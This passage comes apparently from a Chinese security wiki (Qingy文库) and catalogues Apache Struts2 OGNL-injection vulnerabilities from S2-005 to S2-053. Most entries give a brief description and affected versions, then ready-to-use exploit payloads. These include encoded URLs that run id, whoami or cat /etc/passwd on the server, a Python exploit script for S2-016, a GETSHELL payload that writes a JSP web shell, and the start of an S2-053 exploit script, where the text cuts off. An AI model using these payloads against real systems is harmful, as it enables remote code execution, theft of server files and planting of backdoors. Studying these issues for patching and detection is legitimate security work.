一、漏洞简介 通过unicode 编码 \\u0023 绕过struts对#的过滤,再通过设置xwork.MethodAccessor.denyMethodExecution 为false 和memberAccess.allowStaticMethodAccess为true 来绕过沙盒 二、漏洞影响 2.0.0-2.1.8.1 三、复现过程 poc 图片.png /example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:24 "},"Web安全/Apache Struts/（CVE-2011-3923）s2-009/（CVE-2011-3923）s2-009.html":{"url":"Web安全/Apache Struts/（CVE-2011-3923）s2-009/（CVE-2011-3923）s2-009.html","title":"（CVE-2011-3923）s2-009","keywords":"","body":"（CVE-2011-3923）s2-009 一、漏洞简介 这个漏洞跟s2-003 s2-005 属于一套的。Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\\u0023或\\43来绕过；于是Struts2对s2-005的修复方法是禁止\\等特殊符号，使用户不能提交反斜线。但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/HelloWorld.acton?example=&(example)('xxx')=1的方法来执行它，从而绕过官方对#、\\等特殊字符的防 二、漏洞影响 2.1.0 - 2.3.1.1 三、复现过程 没回显 /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true 有回显 /ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)] 图片.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:24 "},"Web安全/Apache Struts/（CVE-2012-0391）s2-008/（CVE-2012-0391）s2-008.html":{"url":"Web安全/Apache Struts/（CVE-2012-0391）s2-008/（CVE-2012-0391）s2-008.html","title":"（CVE-2012-0391）s2-008","keywords":"","body":"（CVE-2012-0391）s2-008 一、漏洞简介 主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码第一种情况其实就是S2-007，在异常处理时的OGNL执行第二种的cookie的方式，虽然在struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，从而较为鸡肋第四种需要开启devModedebug模式 二、漏洞影响 2.1.0 - 2.3.1 三、复现过程 复现采用的是第四种devMode的debug模式，造成的任意代码执行 POC 第一个vulhub给的poc 不好使呀 java.lang.UNIXProcess\\@493c1254 http://localhost:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29) 有回显 /S2-008/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:25 "},"Web安全/Apache Struts/（CVE-2012-0838）s2-007/（CVE-2012-0838）s2-007.html":{"url":"Web安全/Apache Struts/（CVE-2012-0838）s2-007/（CVE-2012-0838）s2-007.html","title":"（CVE-2012-0838）s2-007","keywords":"","body":"（CVE-2012-0838）s2-007 一、漏洞简介 当配置了验证规则，类型转换出错时，进行了错误的字符串拼接，进而造成了OGNL语句的执行。后端用代码拼接 \\\"\\'\\\" + value + \\\"\\'\\\" 然后对其进行 OGNL 表达式解析,比较类似SQL注入单引号闭合,插入语句,官方修复的时候也跟sql注入比较相似,escape 对单引号转义 二、漏洞影响 2.0.0-2.2.3 三、复现过程 poc ' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + ' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:25 "},"Web安全/Apache Struts/（CVE-2013-1965）s2-012/（CVE-2013-1965）s2-012.html":{"url":"Web安全/Apache Struts/（CVE-2013-1965）s2-012/（CVE-2013-1965）s2-012.html","title":"（CVE-2013-1965）s2-012","keywords":"","body":"（CVE-2013-1965）s2-012 一、漏洞简介 如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如： /index.jsp?name=${name} /index.jsp /index.jsp 这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。 二、漏洞影响 2.1.0 - 2.3.13 三、复现过程 poc 图片.png %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:26 "},"Web安全/Apache Struts/（CVE-2013-1966）s2-013/（CVE-2013-1966）s2-013.html":{"url":"Web安全/Apache Struts/（CVE-2013-1966）s2-013/（CVE-2013-1966）s2-013.html","title":"（CVE-2013-1966）s2-013","keywords":"","body":"（CVE-2013-1966）s2-013 一、漏洞简介 struts 的标签中 s:a 和 s:url 都有一个 includeParams 属性none - URL中不包含任何参数（默认）get - 仅包含URL中的GET参数all - 在URL中包含GET和POST参数当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。明明可以urldecode一下就知道params是啥了，但struts给OGNL解析了，就造成了任意代码执行 二、漏洞影响 Struts 2.0.0 - Struts 2.3.14 三、复现过程 POC 就这2种poc 第一个光有回显 ${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())} ${#_memberAccess[\"allowStaticMethodAccess\"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())} Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:26 "},"Web安全/Apache Struts/（CVE-2013-2135）（CVE-2013-2134）s2-015/（CVE-2013-2135）（CVE-2013-2134）s2-015.html":{"url":"Web安全/Apache Struts/（CVE-2013-2135）（CVE-2013-2134）s2-015/（CVE-2013-2135）（CVE-2013-2134）s2-015.html","title":"（CVE-2013-2135）（CVE-2013-2134）s2-015","keywords":"","body":"（CVE-2013-2135）（CVE-2013-2134）s2-015 一、漏洞简介 基于通配符定义的动作映射，如果一个请求跟任何其他定义的操作不匹配，他将会匹配*，并且请求的同操作名称的jsp文件 二、漏洞影响 2.0.0 - 2.3.14.2 三、复现过程 http://www.0-sec.org:8080/example/HelloWorld.action ==>改成 http://www.0-sec.org:8080/example/%25%7B1%2B1%7D.action 图片.png poc %24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:27 "},"Web安全/Apache Struts/（CVE-2013-2248）s2-017/（CVE-2013-2248）s2-017.html":{"url":"Web安全/Apache Struts/（CVE-2013-2248）s2-017/（CVE-2013-2248）s2-017.html","title":"（CVE-2013-2248）s2-017","keywords":"","body":"（CVE-2013-2248）s2-017 一、漏洞简介 Struts 2 DefaultActionMapper用于通过使用\"redirect：\"或\"redirectAction：\"前缀参数来支持短路导航状态更改的方法，然后是所需的重定向目标表达式。该机制旨在帮助将导航信息附加到表单中的按钮。 在2.3.15.1之前的Struts 2中，可以轻松地操作\"redirect：\"或\"redirectAction：\"之后的信息重定向到任意位置。> 相当于s2-016的衍生，单不像之前那样任意命令执行，而是重定向网站 二、漏洞影响 Struts 2.0.0 - Struts 2.3.15 三、复现过程 poc http://www.0-sec.org:8080/struts2-showcase-2.1.6/showcase.action?redirect:http://wiki.0-sec.org/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:28 "},"Web安全/Apache Struts/（CVE-2013-2251）s2-016/（CVE-2013-2251）s2-016.html":{"url":"Web安全/Apache Struts/（CVE-2013-2251）s2-016/（CVE-2013-2251）s2-016.html","title":"（CVE-2013-2251）s2-016","keywords":"","body":"（CVE-2013-2251）s2-016 一、漏洞简介 DefaultActionMapper类支持以\\\"action:\\\"、\\\"redirect:\\\"、\\\"redirectAction:\\\"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令 二、漏洞影响 Struts2.0.0 - Struts2.3.15 三、复现过程 图片.png任意命令执行 redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D ?redirect: ${#a=new java.lang.ProcessBuilder(new java.lang.String[]{\"netstat\",\"-an\"}).start().getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#screen=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#screen.println(#d),#screen.close()} 爆网站路径EXP ?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D python执行任意命令poc import urllib2,sys,re def get(url, data): string = url + \"?\" + data req = urllib2.Request(\"%s\"%string) response = urllib2.urlopen(req).read().strip() print strip(response) def strip(str): tmp = str.strip() blank_line=re.compile('\\x00') tmp=blank_line.sub('',tmp) return tmp if __name__ == '__main__': url = sys.argv[1] cmd = sys.argv[2] cmd1 = sys.argv[3] attack=\"redirect:${%%23a%%3d(new%%20java.lang.ProcessBuilder(new%%20java.lang.String[]{'%s','%s'})).start(),%%23b%%3d%%23a.getInputStream(),%%23c%%3dnew%%20java.io.InputStreamReader(%%23b),%%23d%%3dnew%%20java.io.BufferedReader(%%23c),%%23e%%3dnew%%20char[50000],%%23d.read(%%23e),%%23matt%%3d%%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%%23matt.getWriter().println(%%23e),%%23matt.getWriter().flush(),%%23matt.getWriter().close()}\"%(cmd,cmd1) get(url,attack) GETSHELL EXP ?redirect:${ %23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'), %23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll(\"\\\\\\\\\", \"/\"), new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close() }&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f% 然后用以下代码写shell: code Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:28 "},"Web安全/Apache Struts/（CVE-2013-4316）s2-019/（CVE-2013-4316）s2-019.html":{"url":"Web安全/Apache Struts/（CVE-2013-4316）s2-019/（CVE-2013-4316）s2-019.html","title":"（CVE-2013-4316）s2-019","keywords":"","body":"（CVE-2013-4316）s2-019 一、漏洞简介 二、漏洞影响 Struts 2.0.0 - Struts 2.3.15.1 三、复现过程 漏洞成因 POC https://www.0-sec.org/example/HelloWorld.action?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27ipconfig%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%20%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%20%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29 https://www.0-sec.org/example/HelloWorld.action?debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%22whoami%22).getInputStream())),%23resp.getWriter().flush(),%23resp.getWriter().close() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:28 "},"Web安全/Apache Struts/（CVE-2016-0785）S2-029/（CVE-2016-0785）S2-029.html":{"url":"Web安全/Apache Struts/（CVE-2016-0785）S2-029/（CVE-2016-0785）S2-029.html","title":"（CVE-2016-0785）S2-029","keywords":"","body":"（CVE-2016-0785）S2-029 一、漏洞简介 代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了\"%{}\"。最终造成二次执行。因此需要的条件极为苛刻，特殊的代码，value值为空，可以传参到value，控制name，严格来说应该是个本地漏洞。 二、漏洞影响 Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外） 三、复现过程 S2-029的公告说是可能的远程代码执行。而且依然是ognl导致的。 The Apache Struts frameworks performs double evaluation of attributes values assigned to certain tags so it is possible to pass in a value that will be evaluated again when a tag’s attributes will be rendered. 目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。 比如： xxxxx 通过%{#}的方式获取用户输入放入标签属性，会导致代码执行。struts2的修复方式也是直接过滤了%{}形式的字符串的ognl解析。 1.png 这段代码的修改用来处理掉了非%{开头，}结尾的字符串进行ognl解析的功能，这里我们来举个例子：bar%Ӑ+3}，在修改之前的代码中2+3是会被作为ognl执行的。那么修改后，这种形式就只会被当做字符串来返回。 审计方式就是查看是否有%{#}这种方式获取用户输入变量复制给标签属性的代码写法。 测试代码： [email protected]/* */ import=\"java.util.HashSet\"%> Demo jsp page [email protected]/* */@getRuntime(),#a.exec('touch /tmp/1111'),new java.lang.String('\"); %> xxxxx 2.png 查看tmp目录文件已经生成。 3.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:29 "},"Web安全/Apache Struts/（CVE-2016-3081）s2-032/（CVE-2016-3081）s2-032.html":{"url":"Web安全/Apache Struts/（CVE-2016-3081）s2-032/（CVE-2016-3081）s2-032.html","title":"（CVE-2016-3081）s2-032","keywords":"","body":"（CVE-2016-3081）s2-032 一、漏洞简介 当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。method: Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。 二、漏洞影响 Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外） 三、复现过程 需要开启动态方法调用 使用?method:execute的方式调用execute方法（execute方法是struts2中默认的action调用方法），在method:后面加上我们要执行的ognl表达式即可执行任意代码了 光有回显 poc http://www.0-sec.org/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id /memoindex.action?method:%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23a%3Dnew%20java.util.Scanner(%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.d%5B0%5D)%2C%23str%3D%23a.hasNext()%3F%23a.next()%3A%23parameters.dd%5B0%5D%2C%23w.print(%23str)%2C%23w.close()%2C%23request.toString&cmd=whoami&dd=%20&d=____A&encoding=UTF-8 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:29 "},"Web安全/Apache Struts/（CVE-2016-3087）s2-033/（CVE-2016-3087）s2-033.html":{"url":"Web安全/Apache Struts/（CVE-2016-3087）s2-033/（CVE-2016-3087）s2-033.html","title":"（CVE-2016-3087）s2-033","keywords":"","body":"（CVE-2016-3087）s2-033 一、漏洞简介 当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用\"!\"操作符调用动态方法可能执行ognl表达式，导致代码执行。 二、漏洞影响 Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外） 三、复现过程 POC 有回显版本 %23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=whoami 图片.png 光有回显 %23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id 没回显 %23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=touch%20/tmp/success Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:30 "},"Web安全/Apache Struts/（CVE-2016-4438）s2-037/（CVE-2016-4438）s2-037.html":{"url":"Web安全/Apache Struts/（CVE-2016-4438）s2-037/（CVE-2016-4438）s2-037.html","title":"（CVE-2016-4438）s2-037","keywords":"","body":"（CVE-2016-4438）s2-037 一、漏洞简介 和S2-033一样也是关于rest插件导致method变量被篡改造成的远程代码执行漏洞，这个漏洞和之前S2-033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。 二、漏洞影响 Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外） 三、复现过程 poc 光有回显 /orders/4/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=whoami Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:30 "},"Web安全/Apache Struts/（CVE-2016-6795）s2-042/（CVE-2016-6795）s2-042.html":{"url":"Web安全/Apache Struts/（CVE-2016-6795）s2-042/（CVE-2016-6795）s2-042.html","title":"（CVE-2016-6795）s2-042","keywords":"","body":"（CVE-2016-6795）s2-042 一、漏洞简介 在进行struts2开发时，需要在配置文件(struts.xml)中写一个个action，和对应返回结果的result(可以理解为前端返回的jsp文件)。但是，写的action多了，配置起来就显得特别繁琐了。struts2 Convention插件可以完全抛弃配置，也就是约定优于配置通过这个插件来实现目录的遍历 二、漏洞影响 Struts 2.3.20 - Struts 2.3.31 三、复现过程 测试环境搭建 **(1)**struts版本: struts2.3.24.1 **(2)**convention插件版本: struts2-convention-plugin-2.3.24.1 将struts2-convention-plugin-2.3.24.1.jar复制到/WEB-INF/lib目录下。 样例代码 新建一个GoAction类，放在action包下(convention插件的默认约定位置)。 package action; import com.opensymphony.xwork2.ActionSupport; public class GoAction extends ActionSupport { private String go; private String methodToOGNL; public String execute(){ return go; //方法的返回值，即为resultCode } public String getGo() { return go; } public void setGo(String go) { this.go = go; } public String getMethodToOGNL() { return methodToOGNL; } public void setMethodToOGNL(String methodToOGNL) { this.methodToOGNL = methodToOGNL; } } 在/WEB-INF/content目录下，新建一个admin.jsp: Hello Admin~~ 攻击和调试分析 上述代码目的是，让GoAction起到一个跳转功能。 当admin用户经过验证，需要跳转到jsp页面时。 直接访问url:/go?go=admin，此时的resultCode为admin。 通过convention插件，会在/WEB-INF/content找到admin.jsp，返回给用户。1.png此时，我们就可以通过go参数来控制resultCode。 (1) 遍历目录读取文件 不防先试试跨目录。测试Payload为: http://www.0-sec.org:8080/MyStruts2Test/go?go=../content/admin 这样也成功找到了admin.jsp。 然后，在/WEB-INF/下新建一个hack.jsp文件。简单的跨目录读取成功: 1.png(2)执行任意代码 在补丁分析时，我们看到修补了一个Result执行命令。于是，我们可以在resultCode中嵌入ognl代码试试~ 我们最后要找到admin.jsp文件，于是在路径中嵌入了如下Payload: http://www.0-sec.org:8080/MyStruts2Test/go?go=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin 打断点分析可以看到: 1.png 找到admin.jsp文件后的Result为org.apache.struts2.dispatcher.ServletDispatcherResult对象，并且parse属性为true。location属性中带有OGNL语句，和S2-016漏洞一样，成功运行植入的代码，弹出计算器: 2.png (3)另一种控制resultCode方法 可能注意到了methodToOGNL这个变量没有用，当我们可以选择调用action的某个方法时，比如还有最近出现的rest插件或者打开动态方法调用： 于是就有了如下payload: http://www.0-sec.org:8080/MyStruts2Test/go!getMethodToOGNL?methodToOGNL=%24%7B%23_memberAccess%5B%22excludedClasses%22%5D%3D%7B1%7D%2Cnew%20java.lang.ProcessBuilder%28%27calc%27%29.start%28%29%7D%2f..%2fadmin 我调用了getMethodToOGNL方法，返回methodToOGNL变量的值。就能简接控制resultCode了。当然成功弹出计算器。这种情况，相比前面的情况。恐怕就要普遍些了吧~ 条件: 只需action中有个String变量即可。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:31 "},"Web安全/Apache Struts/（CVE-2017-12611）S2-053/（CVE-2017-12611）S2-053.html":{"url":"Web安全/Apache Struts/（CVE-2017-12611）S2-053/（CVE-2017-12611）S2-053.html","title":"（CVE-2017-12611）S2-053","keywords":"","body":"（CVE-2017-12611）S2-053 一、漏洞简介 在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞 二、漏洞影响 Struts 2.0.1 - 2.3.33Struts 2.5 - 2.5.10 三、复现过程 poc %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} 注意：执行命令的地方在于(#cmd='whoami') python poc Usage exploit.py Example $ python s2-053-exploit.py \"http://127.0.0.1\" \"name\" \"uname -a\" [*] Generated EXP: http://127.0.0.1/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27uname%20-a%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D [*] Exploiting... [+] Response: S2-053 Demo S2-053 Demo Your name: Linux a66c177c2326 4.4.0-70-generic ;jsessionid=64A259D92EC63543AD72E6AA847319C9#91-Ubuntu SMP Wed Mar 22 12:47:43 UTC 2017 x86_64 GNU/Linux Enter your name here: See more at: VulApps - S2-053 [+] Exploit Finished! exploit.py import requests import sys from urllib import quote def exploit(url): res = requests.get(url, 